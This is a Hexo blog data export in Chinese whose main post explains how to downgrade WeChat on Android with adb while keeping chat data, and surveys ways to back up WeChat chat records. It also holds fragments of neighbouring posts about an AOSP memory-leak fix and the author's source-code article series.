title=\"后话\"></a>后话</h2><p>其实每次我在搜到一些问题的解决资料时，都会关注一下帖子的发布时间，我发现IMM内存泄漏这个问题基本都是2019年之前的，好奇就去看了下最新的源码发现果然有所修复。Android系统还是在朝着越来越稳定，性能越来越优秀的方向发展。</p>\n<p>在AOSP的Code Review平台上也可以发现，其实国内外各大手机厂商都对AOSP有着巨大的贡献，大家也不是一味埋头搞自己的定制，有bug还是会反哺修复的。再次感谢开源！</p>\n<p>感兴趣可以浏览，会看到很多change的owner都不是Google的：</p>\n<ul>\n<li><a href=\"https://android-review.googlesource.com/q/xiaomi\">https://android-review.googlesource.com/q/xiaomi</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/huawei\">https://android-review.googlesource.com/q/huawei</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/oppo\">https://android-review.googlesource.com/q/oppo</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/samsung\">https://android-review.googlesource.com/q/samsung</a></li>\n<li><a href=\"https://android-review.googlesource.com/q/sony\">https://android-review.googlesource.com/q/sony</a></li>\n</ul>\n"},{"layout":"post","title":"微信Android端如何安全降级","subtitle":"给你后悔药。","date":"2021-01-25T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 前言\n\n最近微信8.0开始灰度更新，小龙给大家整的新功能我就不赘述了。有不少小伙伴等不及灰度，也开始自行下载安装。\n\n> 微信Android端内测下载链接（复制后通过微信打开即可）：https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index\n\n然而，“后悔药”无论何时都是有市场的。不喜欢or不习惯新版本？想回退旧版本？这让我想到MIUI刷机党回退旧版ROM的麻烦，当然，微信要回退旧版并非难事。\n\n### 降级\n\n对普通用户来说，Android系统是不允许旧版本App安装覆盖掉新版本的，但并不是说就一定不可能。其实任何其他操作系统类似，应用程序安装的产物都是一些文件而已，本质上覆盖它们即可实现降级，只不过在Android中对非ROOT用户来说不能随意改动这些文件，有权限限制。\n\n#### 获取历史版本\n\n既然要降级，我们是不是应该先找到历史版本的Apk？这里直接给大家介绍两个途径吧。\n\n- Apkpure：[微信历史版本下载通道1](https://apkpure.com/cn/wechat/com.tencent.mm/versions)\n- 豌豆荚：[微信历史版本下载通道2](https://www.wandoujia.com/apps/596157/history)\n\n第一个不要选择XAPK+OBB的形式，而选Apk。如果第一个打不开，就看第二个吧，记得选择普通下载，直接获取到Apk文件。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2021012613214266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n\n#### 无痛安全降级（无需备份）\n\n直接在手机中打开刚才下载的Apk是无法进行安装的，系统安装器会提示不能降低版本安装之类的话语。这在Android系统源码中有所对应，感兴趣的同学可以查阅AOSP：[frameworks/base/core/java/com/android/internal/content/PackageHelper.java](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/com/android/internal/content/PackageHelper.java) ，其中定义了此情况的错误码：\n\n```java\npublic static final int RECOMMEND_FAILED_VERSION_DOWNGRADE = -7;\n```\n\n所以，接下来我们需要通过adb命令来安装了（在这之前请保证手机的**开发者选项**是打开状态且开启了其中的**USB调试**和**USB安装**），终端执行即可：\n\n```shell\nadb install -r -d WeChat_v7.0.0_apkpure.com.apk\n```\n\n- `-r` 参数表示覆盖安装且保留数据，这对我们非常重要，微信无数个GB的聊天数据不是说清就能清的，要命。\n- `-d` 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。\n\n> ADB（Android Debug Bridge）是Android平台的官方调试工具，如果各位同学有不是开发人员的，可以自行搜索关键词“adb工具”，不管Windows还是macOS，安装都非常简单。\n\n#### 简单粗暴降级（需备份）\n\n这个方法不用细说，先备份数据，再卸载新版微信，最后安装旧版微信并恢复数据。\n\n### 备份\n\n微信聊天数据的备份方案市面上已经非常多了，大家其实也了解一二。我也简单介绍一下：\n\n#### 网盘云盘\n\n不少知名网盘工具都推出了微信数据备份的功能——把数据备份到三方服务器中。小龙不做的事情，总有人做。\n\n#### 本地备份\n\n很多国产厂商ROM（据我个人使用经验：MIUI、Color OS等，）都实现了本地备份应用数据的功能，不仅仅是微信聊天数据，整个应用数据都给你备份下来。当然，这种系统备份更多是还是备份在本地而非云端，需要注意刷机丢失数据等风险。\n\n争做世界第一产品经理，厂商们也在努力：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210126132206954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n\n#### 电脑备份\n\n使用类似xx手机助手或者微信电脑端的备份功能，把聊天等数据备份到电脑上。在我的实际体验中，用微信电脑端的备份功能，速度特别特别特别慢，几个GB的数据感觉要我几年。\n\n#### ROOT用户手动备份\n\n直接备份 `/data/data/com.tencent.mm` 文件夹即可，微信的各种缓存、聊天数据都在此。其中聊天数据库文件是这个：\n\n`/data/data/com.tencent.mm/MicroMsg/xxxx.../EnMicroMsg.db`\n\n拿到这个db文件其实就可以获取手机中的微信聊天记录了，不过这肯定是加密的，此路径的 `xxxx...` 目录名称实际上是一个遵循一定规则的MD5值，跟设备IMEI和微信帐号相关。具体解密过程可参考：[获取Android微信聊天记录](https://blog.csdn.net/loocanp/article/details/103475998)\n\n我估计这些加密方式应该也是有人逆向微信客户端找出来的。\n\n### 后话\n\n虽然每次微信大版本更新都能引起大家的激烈讨kai论pen，但有些许功能或者优化还是值得肯定的。其实据我观察，大家喷点更多的还是微信客户端占用空间过大，仅凭聊天数据肯定不会占用这么多存储空间，所以具体是存了些什么我们用户就不得而知了。微信作为国民级应用早已不是简单的IM工具，变成如今这般航母型App是迟早的事情，自有国情在嘛是不是。\n\n我个人建议部分特别依赖微信，且对聊天数据特别看重的同学，还是在降级之前稳稳当当地备份一次。因为降级这个操作本质上是旧版本程序+新版本数据的组合，难免出现兼容性问题（即便大部分情况下没什么问题），所以版本跨度也不要过大。\n\n最后，整个图乐一乐，大家不要当真：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210126132229100.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n","source":"_posts/2021-01-26-微信Android端如何安全降级.md","raw":"---\nlayout:     post\ntitle:      微信Android端如何安全降级\nsubtitle:   给你后悔药。\ndate:       2021-01-26\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n    - 鼓捣折腾\n---\n\n### 前言\n\n最近微信8.0开始灰度更新，小龙给大家整的新功能我就不赘述了。有不少小伙伴等不及灰度，也开始自行下载安装。\n\n> 微信Android端内测下载链接（复制后通过微信打开即可）：https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index\n\n然而，“后悔药”无论何时都是有市场的。不喜欢or不习惯新版本？想回退旧版本？这让我想到MIUI刷机党回退旧版ROM的麻烦，当然，微信要回退旧版并非难事。\n\n### 降级\n\n对普通用户来说，Android系统是不允许旧版本App安装覆盖掉新版本的，但并不是说就一定不可能。其实任何其他操作系统类似，应用程序安装的产物都是一些文件而已，本质上覆盖它们即可实现降级，只不过在Android中对非ROOT用户来说不能随意改动这些文件，有权限限制。\n\n#### 获取历史版本\n\n既然要降级，我们是不是应该先找到历史版本的Apk？这里直接给大家介绍两个途径吧。\n\n- Apkpure：[微信历史版本下载通道1](https://apkpure.com/cn/wechat/com.tencent.mm/versions)\n- 豌豆荚：[微信历史版本下载通道2](https://www.wandoujia.com/apps/596157/history)\n\n第一个不要选择XAPK+OBB的形式，而选Apk。如果第一个打不开，就看第二个吧，记得选择普通下载，直接获取到Apk文件。\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2021012613214266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n\n#### 无痛安全降级（无需备份）\n\n直接在手机中打开刚才下载的Apk是无法进行安装的，系统安装器会提示不能降低版本安装之类的话语。这在Android系统源码中有所对应，感兴趣的同学可以查阅AOSP：[frameworks/base/core/java/com/android/internal/content/PackageHelper.java](https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/com/android/internal/content/PackageHelper.java) ，其中定义了此情况的错误码：\n\n```java\npublic static final int RECOMMEND_FAILED_VERSION_DOWNGRADE = -7;\n```\n\n所以，接下来我们需要通过adb命令来安装了（在这之前请保证手机的**开发者选项**是打开状态且开启了其中的**USB调试**和**USB安装**），终端执行即可：\n\n```shell\nadb install -r -d WeChat_v7.0.0_apkpure.com.apk\n```\n\n- `-r` 参数表示覆盖安装且保留数据，这对我们非常重要，微信无数个GB的聊天数据不是说清就能清的，要命。\n- `-d` 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。\n\n> ADB（Android Debug Bridge）是Android平台的官方调试工具，如果各位同学有不是开发人员的，可以自行搜索关键词“adb工具”，不管Windows还是macOS，安装都非常简单。\n\n#### 简单粗暴降级（需备份）\n\n这个方法不用细说，先备份数据，再卸载新版微信，最后安装旧版微信并恢复数据。\n\n### 备份\n\n微信聊天数据的备份方案市面上已经非常多了，大家其实也了解一二。我也简单介绍一下：\n\n#### 网盘云盘\n\n不少知名网盘工具都推出了微信数据备份的功能——把数据备份到三方服务器中。小龙不做的事情，总有人做。\n\n#### 本地备份\n\n很多国产厂商ROM（据我个人使用经验：MIUI、Color OS等，）都实现了本地备份应用数据的功能，不仅仅是微信聊天数据，整个应用数据都给你备份下来。当然，这种系统备份更多是还是备份在本地而非云端，需要注意刷机丢失数据等风险。\n\n争做世界第一产品经理，厂商们也在努力：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210126132206954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n\n\n#### 电脑备份\n\n使用类似xx手机助手或者微信电脑端的备份功能，把聊天等数据备份到电脑上。在我的实际体验中，用微信电脑端的备份功能，速度特别特别特别慢，几个GB的数据感觉要我几年。\n\n#### ROOT用户手动备份\n\n直接备份 `/data/data/com.tencent.mm` 文件夹即可，微信的各种缓存、聊天数据都在此。其中聊天数据库文件是这个：\n\n`/data/data/com.tencent.mm/MicroMsg/xxxx.../EnMicroMsg.db`\n\n拿到这个db文件其实就可以获取手机中的微信聊天记录了，不过这肯定是加密的，此路径的 `xxxx...` 目录名称实际上是一个遵循一定规则的MD5值，跟设备IMEI和微信帐号相关。具体解密过程可参考：[获取Android微信聊天记录](https://blog.csdn.net/loocanp/article/details/103475998)\n\n我估计这些加密方式应该也是有人逆向微信客户端找出来的。\n\n### 后话\n\n虽然每次微信大版本更新都能引起大家的激烈讨kai论pen，但有些许功能或者优化还是值得肯定的。其实据我观察，大家喷点更多的还是微信客户端占用空间过大，仅凭聊天数据肯定不会占用这么多存储空间，所以具体是存了些什么我们用户就不得而知了。微信作为国民级应用早已不是简单的IM工具，变成如今这般航母型App是迟早的事情，自有国情在嘛是不是。\n\n我个人建议部分特别依赖微信，且对聊天数据特别看重的同学，还是在降级之前稳稳当当地备份一次。因为降级这个操作本质上是旧版本程序+新版本数据的组合，难免出现兼容性问题（即便大部分情况下没什么问题），所以版本跨度也不要过大。\n\n最后，整个图乐一乐，大家不要当真：\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/20210126132229100.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center)\n","slug":"微信Android端如何安全降级","published":1,"updated":"2024-03-25T07:31:25.865Z","comments":1,"photos":[],"link":"","_id":"cluaufh17003fthe65h060ulm","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>最近微信8.0开始灰度更新，小龙给大家整的新功能我就不赘述了。有不少小伙伴等不及灰度，也开始自行下载安装。</p>\n<blockquote>\n<p>微信Android端内测下载链接（复制后通过微信打开即可）：<a href=\"https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index\">https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index</a></p>\n</blockquote>\n<p>然而，“后悔药”无论何时都是有市场的。不喜欢or不习惯新版本？想回退旧版本？这让我想到MIUI刷机党回退旧版ROM的麻烦，当然，微信要回退旧版并非难事。</p>\n<h3 id=\"降级\"><a href=\"#降级\" class=\"headerlink\" title=\"降级\"></a>降级</h3><p>对普通用户来说，Android系统是不允许旧版本App安装覆盖掉新版本的，但并不是说就一定不可能。其实任何其他操作系统类似，应用程序安装的产物都是一些文件而已，本质上覆盖它们即可实现降级，只不过在Android中对非ROOT用户来说不能随意改动这些文件，有权限限制。</p>\n<h4 id=\"获取历史版本\"><a href=\"#获取历史版本\" class=\"headerlink\" title=\"获取历史版本\"></a>获取历史版本</h4><p>既然要降级，我们是不是应该先找到历史版本的Apk？这里直接给大家介绍两个途径吧。</p>\n<ul>\n<li>Apkpure：<a href=\"https://apkpure.com/cn/wechat/com.tencent.mm/versions\">微信历史版本下载通道1</a></li>\n<li>豌豆荚：<a href=\"https://www.wandoujia.com/apps/596157/history\">微信历史版本下载通道2</a></li>\n</ul>\n<p>第一个不要选择XAPK+OBB的形式，而选Apk。如果第一个打不开，就看第二个吧，记得选择普通下载，直接获取到Apk文件。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2021012613214266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"无痛安全降级（无需备份）\"><a href=\"#无痛安全降级（无需备份）\" class=\"headerlink\" title=\"无痛安全降级（无需备份）\"></a>无痛安全降级（无需备份）</h4><p>直接在手机中打开刚才下载的Apk是无法进行安装的，系统安装器会提示不能降低版本安装之类的话语。这在Android系统源码中有所对应，感兴趣的同学可以查阅AOSP：<a href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/com/android/internal/content/PackageHelper.java\">frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;content&#x2F;PackageHelper.java</a> ，其中定义了此情况的错误码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">RECOMMEND_FAILED_VERSION_DOWNGRADE</span> <span class=\"operator\">=</span> -<span class=\"number\">7</span>;</span><br></pre></td></tr></table></figure>\n\n<p>所以，接下来我们需要通过adb命令来安装了（在这之前请保证手机的<strong>开发者选项</strong>是打开状态且开启了其中的<strong>USB调试</strong>和<strong>USB安装</strong>），终端执行即可：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb install -r -d WeChat_v7.0.0_apkpure.com.apk</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>-r</code> 参数表示覆盖安装且保留数据，这对我们非常重要，微信无数个GB的聊天数据不是说清就能清的，要命。</li>\n<li><code>-d</code> 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。</li>\n</ul>\n<blockquote>\n<p>ADB（Android Debug Bridge）是Android平台的官方调试工具，如果各位同学有不是开发人员的，可以自行搜索关键词“adb工具”，不管Windows还是macOS，安装都非常简单。</p>\n</blockquote>\n<h4 id=\"简单粗暴降级（需备份）\"><a href=\"#简单粗暴降级（需备份）\" class=\"headerlink\" title=\"简单粗暴降级（需备份）\"></a>简单粗暴降级（需备份）</h4><p>这个方法不用细说，先备份数据，再卸载新版微信，最后安装旧版微信并恢复数据。</p>\n<h3 id=\"备份\"><a href=\"#备份\" class=\"headerlink\" title=\"备份\"></a>备份</h3><p>微信聊天数据的备份方案市面上已经非常多了，大家其实也了解一二。我也简单介绍一下：</p>\n<h4 id=\"网盘云盘\"><a href=\"#网盘云盘\" class=\"headerlink\" title=\"网盘云盘\"></a>网盘云盘</h4><p>不少知名网盘工具都推出了微信数据备份的功能——把数据备份到三方服务器中。小龙不做的事情，总有人做。</p>\n<h4 id=\"本地备份\"><a href=\"#本地备份\" class=\"headerlink\" title=\"本地备份\"></a>本地备份</h4><p>很多国产厂商ROM（据我个人使用经验：MIUI、Color OS等，）都实现了本地备份应用数据的功能，不仅仅是微信聊天数据，整个应用数据都给你备份下来。当然，这种系统备份更多是还是备份在本地而非云端，需要注意刷机丢失数据等风险。</p>\n<p>争做世界第一产品经理，厂商们也在努力：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210126132206954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"电脑备份\"><a href=\"#电脑备份\" class=\"headerlink\" title=\"电脑备份\"></a>电脑备份</h4><p>使用类似xx手机助手或者微信电脑端的备份功能，把聊天等数据备份到电脑上。在我的实际体验中，用微信电脑端的备份功能，速度特别特别特别慢，几个GB的数据感觉要我几年。</p>\n<h4 id=\"ROOT用户手动备份\"><a href=\"#ROOT用户手动备份\" class=\"headerlink\" title=\"ROOT用户手动备份\"></a>ROOT用户手动备份</h4><p>直接备份 <code>/data/data/com.tencent.mm</code> 文件夹即可，微信的各种缓存、聊天数据都在此。其中聊天数据库文件是这个：</p>\n<p><code>/data/data/com.tencent.mm/MicroMsg/xxxx.../EnMicroMsg.db</code></p>\n<p>拿到这个db文件其实就可以获取手机中的微信聊天记录了，不过这肯定是加密的，此路径的 <code>xxxx...</code> 目录名称实际上是一个遵循一定规则的MD5值，跟设备IMEI和微信帐号相关。具体解密过程可参考：<a href=\"https://blog.csdn.net/loocanp/article/details/103475998\">获取Android微信聊天记录</a></p>\n<p>我估计这些加密方式应该也是有人逆向微信客户端找出来的。</p>\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>虽然每次微信大版本更新都能引起大家的激烈讨kai论pen，但有些许功能或者优化还是值得肯定的。其实据我观察，大家喷点更多的还是微信客户端占用空间过大，仅凭聊天数据肯定不会占用这么多存储空间，所以具体是存了些什么我们用户就不得而知了。微信作为国民级应用早已不是简单的IM工具，变成如今这般航母型App是迟早的事情，自有国情在嘛是不是。</p>\n<p>我个人建议部分特别依赖微信，且对聊天数据特别看重的同学，还是在降级之前稳稳当当地备份一次。因为降级这个操作本质上是旧版本程序+新版本数据的组合，难免出现兼容性问题（即便大部分情况下没什么问题），所以版本跨度也不要过大。</p>\n<p>最后，整个图乐一乐，大家不要当真：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210126132229100.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>最近微信8.0开始灰度更新，小龙给大家整的新功能我就不赘述了。有不少小伙伴等不及灰度，也开始自行下载安装。</p>\n<blockquote>\n<p>微信Android端内测下载链接（复制后通过微信打开即可）：<a href=\"https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index\">https://szsupport.weixin.qq.com/cgi-bin/mmsupport-bin/readtemplate?t=page/android_exp__index</a></p>\n</blockquote>\n<p>然而，“后悔药”无论何时都是有市场的。不喜欢or不习惯新版本？想回退旧版本？这让我想到MIUI刷机党回退旧版ROM的麻烦，当然，微信要回退旧版并非难事。</p>\n<h3 id=\"降级\"><a href=\"#降级\" class=\"headerlink\" title=\"降级\"></a>降级</h3><p>对普通用户来说，Android系统是不允许旧版本App安装覆盖掉新版本的，但并不是说就一定不可能。其实任何其他操作系统类似，应用程序安装的产物都是一些文件而已，本质上覆盖它们即可实现降级，只不过在Android中对非ROOT用户来说不能随意改动这些文件，有权限限制。</p>\n<h4 id=\"获取历史版本\"><a href=\"#获取历史版本\" class=\"headerlink\" title=\"获取历史版本\"></a>获取历史版本</h4><p>既然要降级，我们是不是应该先找到历史版本的Apk？这里直接给大家介绍两个途径吧。</p>\n<ul>\n<li>Apkpure：<a href=\"https://apkpure.com/cn/wechat/com.tencent.mm/versions\">微信历史版本下载通道1</a></li>\n<li>豌豆荚：<a href=\"https://www.wandoujia.com/apps/596157/history\">微信历史版本下载通道2</a></li>\n</ul>\n<p>第一个不要选择XAPK+OBB的形式，而选Apk。如果第一个打不开，就看第二个吧，记得选择普通下载，直接获取到Apk文件。</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2021012613214266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"无痛安全降级（无需备份）\"><a href=\"#无痛安全降级（无需备份）\" class=\"headerlink\" title=\"无痛安全降级（无需备份）\"></a>无痛安全降级（无需备份）</h4><p>直接在手机中打开刚才下载的Apk是无法进行安装的，系统安装器会提示不能降低版本安装之类的话语。这在Android系统源码中有所对应，感兴趣的同学可以查阅AOSP：<a href=\"https://cs.android.com/android/platform/superproject/+/master:frameworks/base/core/java/com/android/internal/content/PackageHelper.java\">frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;com&#x2F;android&#x2F;internal&#x2F;content&#x2F;PackageHelper.java</a> ，其中定义了此情况的错误码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> <span class=\"variable\">RECOMMEND_FAILED_VERSION_DOWNGRADE</span> <span class=\"operator\">=</span> -<span class=\"number\">7</span>;</span><br></pre></td></tr></table></figure>\n\n<p>所以，接下来我们需要通过adb命令来安装了（在这之前请保证手机的<strong>开发者选项</strong>是打开状态且开启了其中的<strong>USB调试</strong>和<strong>USB安装</strong>），终端执行即可：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">adb install -r -d WeChat_v7.0.0_apkpure.com.apk</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>-r</code> 参数表示覆盖安装且保留数据，这对我们非常重要，微信无数个GB的聊天数据不是说清就能清的，要命。</li>\n<li><code>-d</code> 参数表示强制将低版本覆盖安装到现有版本上，无论现有高低。</li>\n</ul>\n<blockquote>\n<p>ADB（Android Debug Bridge）是Android平台的官方调试工具，如果各位同学有不是开发人员的，可以自行搜索关键词“adb工具”，不管Windows还是macOS，安装都非常简单。</p>\n</blockquote>\n<h4 id=\"简单粗暴降级（需备份）\"><a href=\"#简单粗暴降级（需备份）\" class=\"headerlink\" title=\"简单粗暴降级（需备份）\"></a>简单粗暴降级（需备份）</h4><p>这个方法不用细说，先备份数据，再卸载新版微信，最后安装旧版微信并恢复数据。</p>\n<h3 id=\"备份\"><a href=\"#备份\" class=\"headerlink\" title=\"备份\"></a>备份</h3><p>微信聊天数据的备份方案市面上已经非常多了，大家其实也了解一二。我也简单介绍一下：</p>\n<h4 id=\"网盘云盘\"><a href=\"#网盘云盘\" class=\"headerlink\" title=\"网盘云盘\"></a>网盘云盘</h4><p>不少知名网盘工具都推出了微信数据备份的功能——把数据备份到三方服务器中。小龙不做的事情，总有人做。</p>\n<h4 id=\"本地备份\"><a href=\"#本地备份\" class=\"headerlink\" title=\"本地备份\"></a>本地备份</h4><p>很多国产厂商ROM（据我个人使用经验：MIUI、Color OS等，）都实现了本地备份应用数据的功能，不仅仅是微信聊天数据，整个应用数据都给你备份下来。当然，这种系统备份更多是还是备份在本地而非云端，需要注意刷机丢失数据等风险。</p>\n<p>争做世界第一产品经理，厂商们也在努力：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210126132206954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h4 id=\"电脑备份\"><a href=\"#电脑备份\" class=\"headerlink\" title=\"电脑备份\"></a>电脑备份</h4><p>使用类似xx手机助手或者微信电脑端的备份功能，把聊天等数据备份到电脑上。在我的实际体验中，用微信电脑端的备份功能，速度特别特别特别慢，几个GB的数据感觉要我几年。</p>\n<h4 id=\"ROOT用户手动备份\"><a href=\"#ROOT用户手动备份\" class=\"headerlink\" title=\"ROOT用户手动备份\"></a>ROOT用户手动备份</h4><p>直接备份 <code>/data/data/com.tencent.mm</code> 文件夹即可，微信的各种缓存、聊天数据都在此。其中聊天数据库文件是这个：</p>\n<p><code>/data/data/com.tencent.mm/MicroMsg/xxxx.../EnMicroMsg.db</code></p>\n<p>拿到这个db文件其实就可以获取手机中的微信聊天记录了，不过这肯定是加密的，此路径的 <code>xxxx...</code> 目录名称实际上是一个遵循一定规则的MD5值，跟设备IMEI和微信帐号相关。具体解密过程可参考：<a href=\"https://blog.csdn.net/loocanp/article/details/103475998\">获取Android微信聊天记录</a></p>\n<p>我估计这些加密方式应该也是有人逆向微信客户端找出来的。</p>\n<h3 id=\"后话\"><a href=\"#后话\" class=\"headerlink\" title=\"后话\"></a>后话</h3><p>虽然每次微信大版本更新都能引起大家的激烈讨kai论pen，但有些许功能或者优化还是值得肯定的。其实据我观察，大家喷点更多的还是微信客户端占用空间过大，仅凭聊天数据肯定不会占用这么多存储空间，所以具体是存了些什么我们用户就不得而知了。微信作为国民级应用早已不是简单的IM工具，变成如今这般航母型App是迟早的事情，自有国情在嘛是不是。</p>\n<p>我个人建议部分特别依赖微信，且对聊天数据特别看重的同学，还是在降级之前稳稳当当地备份一次。因为降级这个操作本质上是旧版本程序+新版本数据的组合，难免出现兼容性问题（即便大部分情况下没什么问题），所以版本跨度也不要过大。</p>\n<p>最后，整个图乐一乐，大家不要当真：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20210126132229100.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n"},{"layout":"post","title":"源码茶舍：App进程创建中的poll机制","subtitle":"深入研究。","date":"2021-01-27T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n挖坑待填，未完待续……\n\n## 系列汇总\n\n转眼间几年过去了，“源码茶舍”也算是我写的第一个系列文章，最初取这个名字的意思便是“像喝茶一样品味AOSP源码”，喝茶讲究什么？当然是悠闲。因此，此系列的文章一般都不长，且大多数都是我平时偶尔遇见的问题或者趣点，总之是比较随意的，研究深度是在我能力范围内尽可能深入。\n\n希望以后还能一如既往地更新这个系列，疏漏错误之处还请大家指点。至此汇总一下往期所有：\n\n- [源码茶舍之没有epoll就没有Handler](https://blog.ysy950803.top/2020/11/18/源码茶舍之没有epoll就没有Handler/)\n- [源码茶舍之如何由Uri找寻ContentProvider](https://blog.ysy950803.top/2020/01/29/源码茶舍之如何由Uri找寻ContentProvider/)\n- [源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒](https://blog.ysy950803.top/2020/01/21/源码茶舍之FLAG_EXCLUDE_STOPPED_PACKAGES与广播唤醒/)\n- [源码茶舍之PackageManager获取注册Service数量问题](https://blog.ysy950803.top/2019/11/02/源码茶舍之PackageManager获取注册Service数量问题/)\n- [源码茶舍之android:externalService是什么属性？实现原理？](https://blog.ysy950803.top/2019/04/10/源码茶舍之android-externalService是什么属性-实现原理/)\n- 